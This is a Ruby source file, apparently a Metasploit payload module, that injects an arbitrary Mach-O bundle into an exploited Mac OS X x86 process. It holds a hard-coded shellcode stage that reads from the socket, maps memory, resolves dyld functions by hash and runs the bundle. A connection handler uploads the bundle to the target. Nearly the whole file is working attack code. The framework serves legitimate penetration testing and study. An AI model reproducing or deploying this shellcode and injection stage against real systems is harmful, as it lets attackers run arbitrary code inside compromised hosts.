require 'msf/core'

module Msf

###
#
# BundleInject common module stub that is meant to be included in payloads that
# make use of Mach-O bundle injection.
#
###
module Payload::Osx::BundleInject

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Mac OS X Inject Mach-O Bundle',
			'Version'       => '$Revision$',
			'Description'   => 'Inject a custom Mach-O bundle into the exploited process',
			'Author'        => 
				[
					'ddz',
				],
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86,
			'PayloadCompat' =>
				{
					'Convention' => 'sockedi'
				},
			'Stage'         =>
				{
					'Payload' =>
						"\xe9\xc1\x00\x00\x00\x8b\x44\x24\x04\x50\x68\x00\x00\xe0\x8f\xe8"+
						"\x03\x00\x00\x00\xc2\x04\x00\x55\x89\xe5\x83\xec\x0c\x53\x56\x57"+
						"\x8b\x5d\x08\x8b\x43\x10\x89\x45\xfc\x80\xc3\x1c\x31\xc0\x39\x45"+
						"\xfc\x0f\x84\x88\x00\x00\x00\x40\x39\x03\x74\x10\x40\x39\x03\x74"+
						"\x41\xff\x4d\xfc\x03\x5b\x04\xe9\xe0\xff\xff\xff\x81\x7b\x0a\x54"+
						"\x45\x58\x54\x74\x0e\x81\x7b\x0a\x4c\x49\x4e\x4b\x74\x10\xe9\xde"+
						"\xff\xff\xff\x8b\x43\x18\x89\x45\xf8\xe9\xd3\xff\xff\xff\x8b\x43"+
						"\x18\x2b\x45\xf8\x03\x45\x08\x2b\x43\x20\x89\x45\xf4\xe9\xbf\xff"+
						"\xff\xff\x8b\x4b\x0c\x31\xc0\x39\xc1\x74\x34\x49\x6b\xd1\x0c\x03"+
						"\x53\x08\x03\x55\xf4\x8b\x32\x03\x73\x10\x03\x75\xf4\x31\xff\xfc"+
						"\x31\xc0\xac\x38\xe0\x74\x0a\xc1\xcf\x0d\x01\xc7\xe9\xef\xff\xff"+
						"\xff\x3b\x7d\x0c\x75\xcf\x8b\x42\x08\x2b\x45\xf8\x03\x45\x08\x5f"+
						"\x5e\x5b\xc9\xc2\x08\x00\x55\x89\xe5\x83\xec\x0c\x89\xfe\x31\xc0"+
						"\xb0\x04\x50\x8d\x7d\xfc\x57\x56\x50\x48\xcd\x80\x72\x12\x39\xc8"+
						"\x74\x0e\x8b\x4d\xfc\x31\xc0\x39\xc1\x74\x05\xe9\x05\x00\x00\x00"+
						"\xe9\xa8\x00\x00\x00\x31\xc0\x50\x68\xff\xff\xff\xff\x68\x02\x10"+
						"\x00\x00\x68\x03\x00\x00\x00\x51\x50\x50\xb0\xc5\xcd\x80\x0f\x82"+
						"\x89\x00\x00\x00\x89\xc7\x89\x7d\xf8\x31\xc0\x51\x57\x56\x50\xb0"+
						"\x03\xcd\x80\x72\x78\x01\xc7\x29\xc1\x75\xee\x8b\x7d\xf8\x83\xec"+
						"\x10\x81\xe4\xf0\xff\xff\xff\x6a\x00\x8d\x45\xf8\x50\xff\x75\x0c"+
						"\x57\x68\x81\x2a\x6b\x74\xe8\xba\xfe\xff\xff\xff\xd0\x3c\x01\x75"+
						"\x4c\x31\xc0\x50\xb0\x05\x50\x54\xff\x75\xf8\x68\x91\x81\xb1\x76"+
						"\xe8\xa0\xfe\xff\xff\xff\xd0\x89\xc3\x31\xc0\x50\x68\x5f\x72\x75"+
						"\x6e\x89\xe0\x50\x53\x68\x9d\xf3\xd0\x4f\xe8\x86\xfe\xff\xff\xff"+
						"\xd0\x81\xec\x0c\x00\x00\x00\x50\x68\x52\x58\x4e\xa5\xe8\x73\xfe"+
						"\xff\xff\xff\xd0\x81\xec\x0c\x00\x00\x00\x56\xff\xd0\x31\xc0\x50"+
						"\x50\xb0\x01\xcd\x80"
				}
			))

		register_options(
			[
				OptPath.new('BUNDLE', [ true, "The local path to the Mach-O bundle to upload" ]),
			], self.class)
	end

	#
	# Transmits the DLL injection payload and its associated DLL to the remote
	# computer so that it can be loaded into memory.
	#
	def handle_connection_stage(conn)
		data = ""

		begin
			File.open(datastore['BUNDLE'], "rb") { |f|
				data += f.read
			}
		rescue
			print_error("Failed to load bundle: #{$!}.")

			# TODO: exception
			conn.close
			return
		end

		print_status("Uploading bundle (#{data.length} bytes)...")

		# Send the size of the thing we're transferring
		conn.put([ data.length ].pack('V'))
		# Send the image
		conn.put(data)

		print_status("Upload completed.")

		# Call the parent so the session gets created.
		super
	end
end
end
